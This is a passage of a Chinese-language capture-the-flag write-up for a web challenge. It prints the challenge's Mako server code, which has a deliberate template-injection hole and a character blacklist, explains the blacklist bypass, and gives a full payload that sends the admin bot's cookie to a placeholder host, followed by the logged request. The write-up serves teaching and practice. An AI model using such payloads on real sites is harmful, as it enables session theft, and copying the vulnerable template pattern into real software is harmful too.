class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qs</span><br><span class="line"><span class="keyword">from</span> bot <span class="keyword">import</span> visit_url</span><br><span class="line"><span class="keyword">from</span> mako.template <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">from</span> mako.lookup <span class="keyword">import</span> TemplateLookup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">MODULE_DIR = os.path.join(os.path.dirname(__file__), <span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(MODULE_DIR):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(MODULE_DIR)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Warning: Could not create Mako module directory: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        MODULE_DIR = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Pixel Rainbow Name&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">        @import url(&#x27;https://fonts.googleapis.com/css2?family=Press+Start+2P&amp;display=swap&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        body &#123;</span></span><br><span class="line"><span class="string">            font-family: &#x27;Press Start 2P&#x27;, cursive;</span></span><br><span class="line"><span class="string">            background-color: #222;</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string">            display: flex;</span></span><br><span class="line"><span class="string">            flex-direction: column;</span></span><br><span class="line"><span class="string">            align-items: center;</span></span><br><span class="line"><span class="string">            justify-content: center;</span></span><br><span class="line"><span class="string">            min-height: 100vh;</span></span><br><span class="line"><span class="string">            margin: 0;</span></span><br><span class="line"><span class="string">            padding: 20px;</span></span><br><span class="line"><span class="string">            box-sizing: border-box;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .container &#123;</span></span><br><span class="line"><span class="string">            background-color: #333;</span></span><br><span class="line"><span class="string">            padding: 30px;</span></span><br><span class="line"><span class="string">            border: 5px solid #555;</span></span><br><span class="line"><span class="string">            box-shadow: 0 0 0 5px #444, 0 0 0 10px #333, 0 0 20px 10px #000;</span></span><br><span class="line"><span class="string">            text-align: center;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        h1 &#123;</span></span><br><span class="line"><span class="string">            font-size: 24px;</span></span><br><span class="line"><span class="string">            color: #0f0; /* Green for a retro feel */</span></span><br><span class="line"><span class="string">            margin-bottom: 20px;</span></span><br><span class="line"><span class="string">            text-shadow: 2px 2px #000;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        label &#123;</span></span><br><span class="line"><span class="string">            font-size: 16px;</span></span><br><span class="line"><span class="string">            color: #ccc;</span></span><br><span class="line"><span class="string">            display: block;</span></span><br><span class="line"><span class="string">            margin-bottom: 10px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        input[type=&quot;text&quot;] &#123;</span></span><br><span class="line"><span class="string">            font-family: &#x27;Press Start 2P&#x27;, cursive;</span></span><br><span class="line"><span class="string">            padding: 10px;</span></span><br><span class="line"><span class="string">            font-size: 16px;</span></span><br><span class="line"><span class="string">            border: 3px solid #555;</span></span><br><span class="line"><span class="string">            background-color: #444;</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string">            margin-bottom: 20px;</span></span><br><span class="line"><span class="string">            outline: none;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        input[type=&quot;submit&quot;] &#123;</span></span><br><span class="line"><span class="string">            font-family: &#x27;Press Start 2P&#x27;, cursive;</span></span><br><span class="line"><span class="string">            padding: 10px 20px;</span></span><br><span class="line"><span class="string">            font-size: 16px;</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string">            background-color: #007bff;</span></span><br><span class="line"><span class="string">            border: 3px solid #0056b3;</span></span><br><span class="line"><span class="string">            cursor: pointer;</span></span><br><span class="line"><span class="string">            transition: background-color 0.2s;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        input[type=&quot;submit&quot;]:hover &#123;</span></span><br><span class="line"><span class="string">            background-color: #0056b3;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .name-display &#123;</span></span><br><span class="line"><span class="string">            margin-top: 30px;</span></span><br><span class="line"><span class="string">            font-size: 32px; /* Base size for rainbow text */</span></span><br><span class="line"><span class="string">            font-weight: bold;</span></span><br><span class="line"><span class="string">            padding: 10px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .rainbow-text &#123;</span></span><br><span class="line"><span class="string">            /* Fallback for browsers that don&#x27;t support background-clip */</span></span><br><span class="line"><span class="string">            color: #fff;</span></span><br><span class="line"><span class="string">            /* Rainbow effect */</span></span><br><span class="line"><span class="string">            background: linear-gradient(to right,</span></span><br><span class="line"><span class="string">                hsl(0, 100%, 50%),  /* Red */</span></span><br><span class="line"><span class="string">                hsl(30, 100%, 50%), /* Orange */</span></span><br><span class="line"><span class="string">                hsl(60, 100%, 50%), /* Yellow */</span></span><br><span class="line"><span class="string">                hsl(120, 100%, 50%),/* Green */</span></span><br><span class="line"><span class="string">                hsl(180, 100%, 50%),/* Cyan */</span></span><br><span class="line"><span class="string">                hsl(240, 100%, 50%),/* Blue */</span></span><br><span class="line"><span class="string">                hsl(300, 100%, 50%) /* Magenta */</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">            -webkit-background-clip: text;</span></span><br><span class="line"><span class="string">            background-clip: text;</span></span><br><span class="line"><span class="string">            color: transparent; /* Make the text itself transparent */</span></span><br><span class="line"><span class="string">            /* Animate the gradient */</span></span><br><span class="line"><span class="string">            animation: rainbow_animation 6s ease-in-out infinite;</span></span><br><span class="line"><span class="string">            background-size: 400% 100%;</span></span><br><span class="line"><span class="string">            text-shadow: none; /* Remove any inherited text-shadow */</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        .rainbow-text span &#123; /* Ensure individual spans also get the effect if we were to wrap letters */</span></span><br><span class="line"><span class="string">             -webkit-background-clip: text;</span></span><br><span class="line"><span class="string">            background-clip: text;</span></span><br><span class="line"><span class="string">            color: transparent;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @keyframes rainbow_animation &#123;</span></span><br><span class="line"><span class="string">            0%, 100% &#123;</span></span><br><span class="line"><span class="string">                background-position: 0 0;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            50% &#123;</span></span><br><span class="line"><span class="string">                background-position: 100% 0;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .instructions &#123;</span></span><br><span class="line"><span class="string">            font-size: 12px;</span></span><br><span class="line"><span class="string">            color: #888;</span></span><br><span class="line"><span class="string">            margin-top: 30px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Pixel Name Display!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;form method=&quot;GET&quot; action=&quot;/&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;name&quot;&gt;Enter Your Name:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name_input&quot; autofocus&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Show Fancy Name&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        % if name_to_display:</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;name-display&quot;&gt;</span></span><br><span class="line"><span class="string">                Your fancy name is:</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;rainbow-text&quot;&gt;NAME&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        % endif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;p class=&quot;instructions&quot;&gt;</span></span><br><span class="line"><span class="string">            Enter a name and see it in glorious pixelated rainbow colors!</span></span><br><span class="line"><span class="string">        &lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p class=&quot;instructions&quot;&gt;</span></span><br><span class="line"><span class="string">            Escaped characters: $&#123;banned&#125;</span></span><br><span class="line"><span class="string">        &lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;submit&quot; value=&quot;Report Name&quot; onclick=&quot;reportName()&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">            function reportName() &#123;</span></span><br><span class="line"><span class="string">                // Get from query string</span></span><br><span class="line"><span class="string">                const name = new URLSearchParams(window.location.search).get(&#x27;name_input&#x27;);</span></span><br><span class="line"><span class="string">                if (name) &#123;</span></span><br><span class="line"><span class="string">                    fetch(&#x27;/report&#x27;, &#123;</span></span><br><span class="line"><span class="string">                        method: &#x27;POST&#x27;,</span></span><br><span class="line"><span class="string">                        headers: &#123;</span></span><br><span class="line"><span class="string">                            &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span></span><br><span class="line"><span class="string">                        &#125;,</span></span><br><span class="line"><span class="string">                        body: JSON.stringify(&#123; name: name &#125;)</span></span><br><span class="line"><span class="string">                    &#125;)</span></span><br><span class="line"><span class="string">                    .then(response =&gt; &#123;</span></span><br><span class="line"><span class="string">                        if (response.ok) &#123;</span></span><br><span class="line"><span class="string">                            alert(&#x27;Name reported successfully!&#x27;);</span></span><br><span class="line"><span class="string">                        &#125; else &#123;</span></span><br><span class="line"><span class="string">                            alert(&#x27;Failed to report name.&#x27;);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                    &#125;)</span></span><br><span class="line"><span class="string">                    .catch(error =&gt; &#123;</span></span><br><span class="line"><span class="string">                        console.error(&#x27;Error reporting name:&#x27;, error);</span></span><br><span class="line"><span class="string">                    &#125;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">lookup = TemplateLookup(directories=[os.path.dirname(__file__)], module_directory=MODULE_DIR)</span><br><span class="line"></span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escape_html</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Escapes HTML special characters in the given text.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> text.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>).replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&amp;#40;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#41;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">name_to_display=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Renders the HTML page with the given name.&quot;&quot;&quot;</span></span><br><span class="line">    templ = html_template.replace(<span class="string">&quot;NAME&quot;</span>, escape_html(name_to_display <span class="keyword">or</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line">    template = Template(templ, lookup=lookup)</span><br><span class="line">    <span class="keyword">return</span> template.render(name_to_display=name_to_display, banned=<span class="string">&quot;&amp;&lt;&gt;()&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleHTTPRequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Parse the path and extract query parameters</span></span><br><span class="line">        parsed_url = urlparse(<span class="variable language_">self</span>.path)</span><br><span class="line">        params = parse_qs(parsed_url.query)</span><br><span class="line">        name = params.get(<span class="string">&quot;name_input&quot;</span>, [<span class="string">&quot;&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> banned:</span><br><span class="line">            <span class="keyword">if</span> b <span class="keyword">in</span> name:</span><br><span class="line">                name = <span class="string">&quot;Banned characters detected!&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Render and return the page</span></span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">        <span class="variable language_">self</span>.wfile.write(render_page(name_to_display=name).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># Handle POST requests to report names</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&quot;/report&quot;</span>:</span><br><span class="line">            content_length = <span class="built_in">int</span>(<span class="variable language_">self</span>.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">            post_data = <span class="variable language_">self</span>.rfile.read(content_length)</span><br><span class="line">            name = json.loads(post_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)).get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Received name: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> name:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Reported name: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;Name reported successfully!&quot;</span>)</span><br><span class="line">                Thread(target=visit_url, args=(name,)).start()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">400</span>)</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;Bad Request: No name provided.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">404</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_server</span>(<span class="params">server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=<span class="number">8000</span></span>):</span><br><span class="line">    server_address = (<span class="string">&quot;0.0.0.0&quot;</span>, port)</span><br><span class="line">    httpd = server_class(server_address, handler_class)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Starting http server on port <span class="subst">&#123;port&#125;</span>...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Access the page at http://0.0.0.0:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nServer stopped.&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        httpd.server_close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    run_server()</span><br></pre></td></tr></table></figure>

<p>漏洞成因：Mako SSTI 可导致 XSS -&gt; 读 bot 的 cookie</p>
<ol>
<li>服务器把用户输入 <code>name_input</code> 先替换进模板源代码，然后才让 Mako 编译与渲染：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">templ = html_template.replace(<span class="string">&quot;NAME&quot;</span>, escape_html(name_to_display <span class="keyword">or</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line">template = Template(templ, lookup=lookup)</span><br><span class="line"><span class="keyword">return</span> template.render(name_to_display=name_to_display, banned=<span class="string">&quot;&amp;&lt;&gt;()&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>也就是说，我们的输入会进入 Mako 模板源 再被 Mako 解析执行（而不是只作为纯文本）。这是典型的SSTI场景。<br>2. 题目做了两层限制：</p>
<ul>
<li><code>escape_html()</code> 仅转义了 <code>&amp; &lt; &gt; ( )</code>；没有转义 <code>$&#123;&#125;</code>，而 <code>$&#123; ... &#125;</code> 正是 Mako 表达式的执行语法。</li>
<li>黑名单 <code>banned = [&quot;s&quot;,&quot;l&quot;,&quot;(&quot;,&quot;)&quot;,&quot;self&quot;,&quot;_&quot;,&quot;.&quot;,&quot;\&quot;&quot;, &quot;\\&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;os&quot;, &quot;;&quot;, &quot;,&quot;, &quot;|&quot;]</code>：如果输入里包含这些，就把名字直接替换成固定字符串。但黑名单只禁了小写 s&#x2F;l、双引号等，没有禁止 <code>$&#123;&#125;</code>、方括号、反引号、加号、冒号等，也没有禁止大写。</li>
</ul>
<ol start="3">
<li>模板向渲染环境里注入了变量 <code>banned=&quot;&amp;&lt;&gt;()&quot;</code>。这给了我们一个字符生成器：<br><code>banned[1] 是 &lt;，banned[2] 是 &gt;，banned[3] 是 (，banned[4] 是 )</code>。这样即使输入里不能出现 <code>&lt;&gt;()</code>，也能在 Mako 表达式里拼出来。</li>
<li>bot 端逻辑：Selenium 打开站点后，手动种入名为 flag 的 cookie，再访问我们提交的 <code>/?name_input=...</code> 页面，且停留 200 秒，让前端 JS 有充足时间执行。只要我们能在 bot 的页面里执行 JS，就能读到 document.cookie 并外带。</li>
</ol>
<p>综上：通过 Mako SSTI → 反射 XSS，在 bot 的浏览器中运行 JS，读取并外带 flag cookie。</p>
<p>绕过思路</p>
<ul>
<li>用大写标签名绕过小写s黑名单</li>
<li>用反引号作 JS 的字符串&#x2F;属性访问（例如 <code>window[`open`]、window[`document`][`cookie`]</code>），避免在 JS 中使用单&#x2F;双引号</li>
<li>用模板变量 <code>banned[1..4]</code> 生成 <code>&lt; &gt; ( )</code></li>
<li>用 <code>window[`open`]</code> 替代 <code>window[`location`]</code> 来发请求，绕过小写l黑名单</li>
<li>用 <code>String[`fromCharCode`](46)</code> 生成点号<code>.</code></li>
</ul>
<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;banned[1]+&#x27;SCRIPT&#x27;+banned[2]+&#x27;window[&#x27;+&#x27;`open`&#x27;+&#x27;]&#x27;+banned[3]+&#x27;`http://xx`&#x27;+&#x27;+&#x27;+&#x27;String[`fromCharCode`]&#x27;+banned[3]+&#x27;46&#x27;+banned[4]+&#x27;+&#x27;+&#x27;`xxx`&#x27;+&#x27;+&#x27;+&#x27;String[`fromCharCode`]&#x27;+banned[3]+&#x27;46&#x27;+banned[4]+&#x27;+&#x27;+&#x27;`xx`&#x27;+&#x27;+&#x27;+&#x27;String[`fromCharCode`]&#x27;+banned[3]+&#x27;46&#x27;+banned[4]+&#x27;+&#x27;+&#x27;`xxx?c=`&#x27;+&#x27;+&#x27;+&#x27;window[&#x27;+&#x27;`document`&#x27;+&#x27;][&#x27;+&#x27;`cookie`&#x27;+&#x27;]&#x27;+banned[4]+banned[1]+&#x27;/SCRIPT&#x27;+banned[2]&#125;</span><br><span class="line"></span><br><span class="line">渲染后变为</span><br><span class="line">&lt;script&gt;window[`open`](`http://xx`+String[`fromCharCode`](46)+`xxx`+String[`fromCharCode`](46)+`xx`+String[`fromCharCode`](46)+`xxx?c=`+window[`document`][`cookie`])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?c=flag=TFCCTF&#123;769d12568fc45f14056cbabec2421548a839fa464786dc2013b2453dab9c3cbe&#125; HTTP/1.1</span><br><span class="line">Host: xx.xxx.xx.xxx</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://localhost:8000/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br></pre></td></tr></table></figure>

<p>flag<code>TFCCTF&#123;769d12568fc45f14056cbabec2421548a839fa464786dc2013b2453dab9c3cbe&#125;</code></p>
<p>后面在discord里看到另一种构造s和l的方式，学习</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">you could do $&#123;f&#x27;&#123;dict&#125;&#x27;[4]&#125; for s and 2 for l</span><br><span class="line"></span><br><span class="line">dict gives us &lt;class &#x27;dict&#x27;&gt; and then we convert it to string and access those letters like s , l</span><br></pre></td></tr></table></figure>

<h2 id="KISSFIXESS-REVENGE"><a href="#KISSFIXESS-REVENGE" class="headerlink" title="KISSFIXESS REVENGE"></a>KISSFIXESS REVENGE</h2><p>与上题相比，改动如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;JAVASCRIPT&quot;</span>, <span class="string">&quot;window&quot;</span>, <span class="string">&quot;atob&quot;</span>, <span class="string">&quot;btoa&quot;</span>, <span class="string">&quot;=&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">name_to_display=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Renders the HTML page with the given name.&quot;&quot;&quot;</span></span><br><span class="line">    templ = html_template.replace(<span class="string">&quot;NAME&quot;</span>, name_to_display <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">    template = Template(templ, lookup=lookup)</span><br><span class="line">    tp = template.render(name_to_display=name_to_display, banned=<span class="string">&quot;&amp;&lt;&gt;()&quot;</span>, copyright=<span 